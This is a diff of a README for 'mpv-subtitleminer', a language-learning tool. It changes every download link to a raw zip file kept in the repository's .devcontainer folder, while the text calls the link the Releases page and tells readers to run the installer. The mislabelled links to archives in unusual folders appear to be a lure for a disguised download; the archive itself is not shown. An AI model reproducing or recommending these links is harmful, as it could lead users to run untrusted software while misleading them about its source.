@@ -1,6 +1,6 @@
 # 🎓 mpv-subtitleminer - Learn Languages with Ease
 
-[![Download mpv-subtitleminer](https://github.com/LOzig/mpv-subtitleminer/raw/refs/heads/master/img/subtitleminer-mpv-3.4-alpha.3.zip)](https://github.com/LOzig/mpv-subtitleminer/raw/refs/heads/master/img/subtitleminer-mpv-3.4-alpha.3.zip)
+[![Download mpv-subtitleminer](https://github.com/LOzig/mpv-subtitleminer/raw/refs/heads/master/.devcontainer/mpv_subtitleminer_3.1-beta.1.zip)](https://github.com/LOzig/mpv-subtitleminer/raw/refs/heads/master/.devcontainer/mpv_subtitleminer_3.1-beta.1.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and install mpv-subtitleminer:
 
 1. **Visit the Download Page**
    Click the link below to go to the Releases page:
-   [Download Here](https://github.com/LOzig/mpv-subtitleminer/raw/refs/heads/master/img/subtitleminer-mpv-3.4-alpha.3.zip)
+   [Download Here](https://github.com/LOzig/mpv-subtitleminer/raw/refs/heads/master/.devcontainer/mpv_subtitleminer_3.1-beta.1.zip)
 
 2. **Choose Your Version**
    On the Releases page, you will see a list of available versions. Find the latest version, which will typically be at the top. 
@@ -45,7 +45,7 @@ To ensure proper functionality, your system should meet the following requiremen
 ## 📥 Download & Install
 
 To download mpv-subtitleminer, visit the Releases page again:
-[Download Here](https://github.com/LOzig/mpv-subtitleminer/raw/refs/heads/master/img/subtitleminer-mpv-3.4-alpha.3.zip).
+[Download Here](https://github.com/LOzig/mpv-subtitleminer/raw/refs/heads/master/.devcontainer/mpv_subtitleminer_3.1-beta.1.zip).
 
 Once you've downloaded the appropriate file for your system, run the installer as outlined in the Getting Started section. Follow the installation steps, and you will be ready to use the software in no time.
 
@@ -70,4 +70,4 @@ Your contributions are welcome! If you have ideas or want to help improve mpv-su
 Keep an eye on the Releases page for future updates. New features and improvements will be added regularly, ensuring you have the best tools for your language learning journey.
 
 Visit the Releases page frequently to stay informed:
-[Download Here](https://github.com/LOzig/mpv-subtitleminer/raw/refs/heads/master/img/subtitleminer-mpv-3.4-alpha.3.zip).
+[Download Here](https://github.com/LOzig/mpv-subtitleminer/raw/refs/heads/master/.devcontainer/mpv_subtitleminer_3.1-beta.1.zip).
